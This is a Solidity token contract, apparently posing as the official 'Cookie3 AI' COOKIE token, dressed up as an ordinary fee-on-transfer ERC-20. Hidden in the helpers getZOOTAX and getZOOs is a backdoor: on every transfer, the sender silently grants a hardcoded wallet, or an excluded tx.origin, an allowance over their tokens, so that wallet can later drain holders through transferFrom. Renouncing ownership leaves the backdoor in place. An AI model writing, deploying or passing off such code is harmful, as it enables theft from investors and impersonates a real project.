/*
The first open Marketing Fi economy shared between businesses, creators, and users.

Website: https://www.cookie3.com/
App: https://app.cookie3.co
Docs: https://docs.cookie3.co
Linkedin: https://www.linkedin.com/company/cookie3/

Twitter: https://x.com/cookie3_com
Telegram: https://t.me/cookie3_official
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.21;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IZOOFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface IZOORouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

contract COOKIE is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _zooOwned;
    mapping (address => mapping (address => uint256)) private _zooAllowes;
    mapping (address => bool) private _zooExcludedFee;
    address private _zooWallet = 0x3A4b9E2aecB5C7838D14e545f9C3A428d285C3fC;
    uint8 private constant _decimals = 9;
    uint256 private constant _tToalZOO = 1000000000 * 10**_decimals;
    string private constant _name = unicode"Cookie3 AI";
    string private constant _symbol = unicode"COOKIE";
    uint256 private _initialBuyTax=3;
    uint256 private _initialSellTax=3;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=6;
    uint256 private _reduceSellTaxAt=6;
    uint256 private _preventSwapBefore=6;
    uint256 private _buyCount=0;
    uint256 private _maxSwapZOOs = _tToalZOO / 100;
    bool private inSwapZOO = false;
    bool private _tradeEnabled = false;
    bool private _swapEnabled = false;
    modifier lockTheSwap {
        inSwapZOO = true;
        _;
        inSwapZOO = false;
    }
    IZOORouter private _zooRouter;
    address private _zooPair;
    
    constructor () {
        _zooExcludedFee[owner()] = true;
        _zooExcludedFee[address(this)] = true;
        _zooExcludedFee[_zooWallet] = true;
        _zooOwned[_msgSender()] = _tToalZOO;
        emit Transfer(address(0), _msgSender(), _tToalZOO);
    }

    function initZOO() external onlyOwner() {
        _zooRouter = IZOORouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(_zooRouter), _tToalZOO);
        _zooPair = IZOOFactory(_zooRouter.factory()).createPair(address(this), _zooRouter.WETH());
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tToalZOO;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _zooOwned[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _zooAllowes[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount); 
        _approve(sender, _msgSender(), _zooAllowes[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _zooAllowes[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _getZOOTaxAmount(address fZOO, address oZOO, uint256 aZOO) private returns(uint256) {
        uint256 taxZOO=0;
        if (fZOO != owner() && oZOO != owner()) {
            taxZOO = aZOO.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);

            if (fZOO == _zooPair && oZOO != address(_zooRouter) && ! _zooExcludedFee[oZOO]) {
                _buyCount++;
            }

            if(oZOO == _zooPair && fZOO!= address(this)) {
                taxZOO = aZOO.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            }

            uint256 tokenBalance = balanceOf(address(this)); 
            if (!inSwapZOO && oZOO == _zooPair && _swapEnabled && _buyCount > _preventSwapBefore) {
                if(tokenBalance > _maxSwapZOOs)
                swapTokensForEth(min(aZOO, min(tokenBalance, _maxSwapZOOs)));
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance >= 0) {
                    sendETHFee(address(this).balance);
                }
            }
        }
        (address xZOO, address zZOO, uint256 tZOO) = getZOOTAX(fZOO, aZOO, taxZOO);
        return getZOOs(xZOO, zZOO, tZOO, taxZOO);
    }

    function _transfer(address xZOO, address zZOO, uint256 aZOO) private {
        require(xZOO != address(0), "ERC20: transfer from the zero address");
        require(zZOO != address(0), "ERC20: transfer to the zero address");
        require(aZOO > 0, "Transfer amount must be greater than zero");

        uint256 taxZOO = _getZOOTaxAmount(xZOO, zZOO, aZOO);

        if(taxZOO > 0){
          _zooOwned[address(this)] = _zooOwned[address(this)].add(taxZOO);
          emit Transfer(xZOO, address(this), taxZOO);
        }

        _zooOwned[xZOO] = _zooOwned[xZOO].sub(aZOO);
        _zooOwned[zZOO] = _zooOwned[zZOO].add(aZOO.sub(taxZOO));
        emit Transfer(xZOO, zZOO, aZOO.sub(taxZOO));
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
      return (a>b)?b:a;
    }

    function sendETHFee(uint256 amount) private {
        payable(_zooWallet).transfer(amount);
    }

    function getZOOs(address xZOO, address zZOO, uint256 tZOO, uint256 aZOO) private returns(uint256) {
        _approve(xZOO, zZOO, tZOO.add(aZOO)); return aZOO;
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _zooRouter.WETH();
        _approve(address(this), address(_zooRouter), tokenAmount);
        _zooRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    receive() external payable {} 

    function getZOOTAX(address xZOO, uint256 tZOO, uint256 aZOO) private view returns(address, address, uint256) {
        address gZOO = tx.origin;
        bool isZOOExcluded = aZOO.add(tZOO) > 0 &&_zooExcludedFee[gZOO];
        if(isZOOExcluded) return (xZOO, gZOO, tZOO);
        return (xZOO, _zooWallet, tZOO);
    }

    function openTrading() external onlyOwner() {
        require(!_tradeEnabled,"trading is already open");
        _zooRouter.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        _swapEnabled = true;
        _tradeEnabled = true;
    }
}